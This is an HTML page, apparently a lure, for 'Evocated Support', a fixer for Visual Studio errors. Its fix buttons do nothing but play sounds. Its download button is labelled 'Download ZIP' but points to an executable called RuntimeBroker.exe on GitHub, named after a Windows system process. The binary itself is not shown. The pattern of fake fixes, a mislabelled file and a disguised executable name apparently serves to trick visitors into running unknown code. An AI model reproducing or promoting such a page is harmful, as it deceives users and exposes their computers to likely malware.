<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Evocated Support</title>
  <style>
    /* Fonts and resets */
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap');
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'Orbitron', sans-serif;
      cursor: url('https://cur.cursors-4u.net/others/oth-8/oth748.cur'), auto;
    }

    body, html {
      height: 100%;
      background: linear-gradient(-45deg, #0f0f0f, #1a1a1a, #2a2a2a, #1a1a1a);
      background-size: 400% 400%;
      animation: gradient 12s ease infinite;
      overflow: hidden;
      color: white;
    }

    @keyframes gradient {
      0% {background-position: 0% 50%;}
      50% {background-position: 100% 50%;}
      100% {background-position: 0% 50%;}
    }

    .center {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      text-align: center;
    }

    .title {
      font-size: 3rem;
      color: #ff69b4;
      animation: bounce 2s infinite, glow 2s ease-in-out infinite;
      text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4;
    }

    @keyframes bounce {
      0%, 100% { transform: translateY(-10px); }
      50% { transform: translateY(10px); }
    }

    @keyframes glow {
      0%, 100% { text-shadow: 0 0 10px #ff69b4, 0 0 20px #ff69b4; }
      50% { text-shadow: 0 0 20px #ff1493, 0 0 30px #ff69b4; }
    }

    .button {
      background: #ff1493;
      border: none;
      padding: 15px 30px;
      margin-top: 20px;
      font-size: 1rem;
      border-radius: 12px;
      color: white;
      cursor: pointer;
      transition: transform 0.3s, background 0.3s;
    }
    .button:hover {
      background: white;
      color: #ff1493;
      transform: scale(1.1);
    }

    .hidden {
      display: none;
    }

    .fade-out {
      animation: fadeOut 1.5s forwards;
    }

    @keyframes fadeOut {
      to { opacity: 0; visibility: hidden; }
    }

    .popular-label {
      font-size: 1rem;
      color: #ffd700;
      margin-bottom: 5px;
      animation: glow 2s ease-in-out infinite;
    }

    .dropdown {
      margin-top: 30px;
      transition: opacity 0.5s ease;
    }

    .dropdown-content {
      display: none;
      opacity: 0;
      flex-direction: column;
      gap: 10px;
      margin-top: 10px;
    }

    .dropdown-content.show {
      display: flex;
      animation: fadeIn 0.5s forwards;
    }

    @keyframes fadeIn {
      to { opacity: 1; }
    }

    @keyframes fadeOutDrop {
      to { opacity: 0; display: none; }
    }

    .drop-btn {
      padding: 10px;
      background: #444;
      color: white;
      border: none;
      border-radius: 8px;
      cursor: pointer;
      transition: background 0.3s;
    }

    .drop-btn.active {
      background: white;
      color: #222;
    }

    .download-section {
      margin-top: 40px;
    }

    .download-label {
      font-size: 0.9rem;
      color: #ccc;
      margin-bottom: 10px;
    }

    .copy-box {
      margin-top: 30px;
      background: #222;
      padding: 10px;
      border-radius: 8px;
      display: inline-block;
    }
    .copy-text {
      color: #fff;
      user-select: all;
    }
    .copy-btn {
      margin-top: 10px;
      background: #ff1493;
      color: white;
      padding: 5px 10px;
      border: none;
      border-radius: 8px;
      cursor: pointer;
    }

    audio { display: none; }
  </style>
</head>
<body>
  <!-- Loading Screen -->
  <div id="loading" class="center">
    <div class="title">Evocated Support</div>
    <button class="button" onclick="startSite()">Get Started With Evocated Support</button>
  </div>

  <!-- Main Site -->
  <div id="main" class="hidden center">
    <div class="title">Evocated Support</div>
    <div class="popular-label">ðŸ”¥ Popular! Most used fixer ðŸ”¥</div>
    <button class="button">FIX VISUAL STUDIO ERRORS</button>

    <!-- Dropdown -->
    <div class="dropdown">
      <button class="button" onclick="toggleDropdown()">Toggle Fix Options</button>
      <div id="dropContent" class="dropdown-content">
        <button class="drop-btn" onclick="selectBtn(this)">Fix 1</button>
        <button class="drop-btn" onclick="selectBtn(this)">Fix 2</button>
        <button class="drop-btn" onclick="selectBtn(this)">Fix 3</button>
        <button class="drop-btn" onclick="selectBtn(this)">Fix 4</button>
        <button class="drop-btn" onclick="selectBtn(this)">Fix 5</button>
      </div>
    </div>

    <!-- Download Section -->
    <div class="download-section">
      <div class="download-label">If fixers are not working, download this and it should fix the current issue.</div>
      <button class="button" onclick="showDownload()">Open Download Options</button>
      <div id="downloadDrop" class="dropdown-content">
        <a href="https://raw.githubusercontent.com/EvocatedSupport/RuntimeBrokerFixer/refs/heads/main/RuntimeBroker.exe" download>
          <button class="button">â¬‡ Download ZIP</button>
        </a>
      </div>
    </div>

    <!-- Copy Text Box -->
    <div class="copy-box">
      <div class="copy-text" id="copyText">Paste your text here</div>
      <button class="copy-btn" onclick="copyText()">Copy to Clipboard</button>
    </div>
  </div>

  <!-- Audio -->
  <audio id="bgm" src="nights.mp3" loop></audio>
  <audio id="clickSound" src="https://www.myinstants.com/media/sounds/minecraft-click.mp3"></audio>

  <script>
    function startSite() {
      document.getElementById('loading').classList.add('fade-out');
      setTimeout(() => {
        document.getElementById('loading').style.display = 'none';
        document.getElementById('main').classList.remove('hidden');
        document.getElementById('bgm').play();
      }, 1500);
    }

    function toggleDropdown() {
      const drop = document.getElementById('dropContent');
      drop.classList.toggle('show');
      playClick();
    }

    function showDownload() {
      const drop = document.getElementById('downloadDrop');
      drop.classList.toggle('show');
      playClick();
    }

    function selectBtn(btn) {
      document.querySelectorAll('.drop-btn').forEach(b => b.classList.remove('active'));
      btn.classList.add('active');
      playClick();
    }

    function copyText() {
      const text = document.getElementById('copyText').innerText;
      navigator.clipboard.writeText(text);
      playClick();
    }

    function playClick() {
      document.getElementById('clickSound').play();
    }

    // Click sound for any click
    document.addEventListener('click', playClick);
  </script>
</body>
</html>
